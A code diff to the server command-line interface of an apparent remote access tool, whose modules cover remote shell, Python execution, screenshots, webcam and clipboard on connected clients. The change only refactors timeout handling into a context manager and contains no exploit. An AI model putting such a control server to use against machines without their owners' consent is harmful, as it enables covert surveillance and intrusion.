@@ -10,6 +10,7 @@ from cryptography.hazmat.primitives.asymmetric import ec
 from modules import clipboard, download, filetransfer, screenshot, webcam, windows
 from modules.baseserver import BaseServer
 from utils import terminal
+from utils.timeout_handler import TimeoutSetter
 
 # Enables using arrowkeys on unix-like systems
 with suppress(ImportError):
@@ -152,20 +153,17 @@ class ServerCLI(BaseServer, cmd.Cmd):
                 print(self.client.shell(command).decode(), end='')
                 # TODO: update cwd accordingly
 
-            # Increase timeout to 60 seconds for shell
-            self.client.conn.settimeout(60)
-            try:
-                print(self.client.shell(command).decode(), end='')
-            except TimeoutError:
-                logging.info('Shell command timed out: %s', self.client.id)
-                # Prompt user if they want to increase the timeout limit
-                if terminal.increase_timeout_prompt():
-                    # Indefinitely block for output
-                    self.client.conn.settimeout(None)
-                    print(self.client.read().decode(), end='')
-            finally:
-                # Set timeout back to default
-                self.client.conn.settimeout(socket.getdefaulttimeout())
+            # Increase timeout for shell
+            with TimeoutSetter(self.client, 60):
+                try:
+                    print(self.client.shell(command).decode(), end='')
+                except TimeoutError:
+                    logging.info('Shell command timed out: %s', self.client.id)
+                    # Prompt user if they want to increase the timeout limit
+                    if terminal.increase_timeout_prompt():
+                        # Indefinitely block for output
+                        self.client.conn.settimeout(None)
+                        print(self.client.read().decode(), end='')
 
     def do_python(self, _) -> None:
         """ Open a python interpreter to client """
@@ -178,19 +176,17 @@ class ServerCLI(BaseServer, cmd.Cmd):
             if command.strip().lower() in ['exit', 'exit()']:
                 break
 
-            # Increase timeout to 60 seconds for python interpreter
-            self.client.conn.settimeout(60)
-            try:
-                print(self.client.python(command).decode(), end='')
-            except TimeoutError:
-                logging.info('Python command timed out: %s', self.client.id)
-                # Prompt user if they want to increase the timeout limit
-                if terminal.increase_timeout_prompt():
-                    # Indefinitely block for output
-                    self.client.conn.settimeout(None)
-                    print(self.client.read().decode(), end='')
-            finally:
-                self.client.conn.settimeout(socket.getdefaulttimeout())
+            # Increase timeout for interpreter
+            with TimeoutSetter(self.client, 60):
+                try:
+                    print(self.client.python(command).decode(), end='')
+                except TimeoutError:
+                    logging.info('Python command timed out: %s', self.client.id)
+                    # Prompt user if they want to increase the timeout limit
+                    if terminal.increase_timeout_prompt():
+                        # Indefinitely block for output
+                        self.client.conn.settimeout(None)
+                        print(self.client.read().decode(), end='')
 
     def do_screenshot(self, _) -> None:
         """ Take a screenshot and save it in a file """
